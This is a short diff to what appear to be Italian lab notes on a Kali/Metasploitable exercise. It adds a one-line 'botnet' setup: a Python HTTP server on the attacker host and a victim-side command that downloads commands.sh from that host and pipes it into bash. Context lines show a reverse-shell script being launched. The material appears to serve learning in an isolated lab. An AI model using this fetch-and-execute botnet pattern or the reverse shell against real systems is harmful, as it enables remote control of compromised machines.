@@ -48,3 +48,10 @@ python reverseShell.py 192.168.1.101 &
 # creazione file che contiene comandi da far eseguire ai bot
 kali@kali:~$ touch commands.sh
 kali@kali:~$ echo "ping 172.217.9.206" > commands.sh
+
+# creazione server botnet monoriga
+kali@kali:~$ python3 -m http.server 8080
+
+# si potrebbe creare un client bot che scarichi lo script e lo esegue
+
+msfadmin@metasploitable:~$ wget-0 - 192.168.1.101:8080/commands.sh | bash
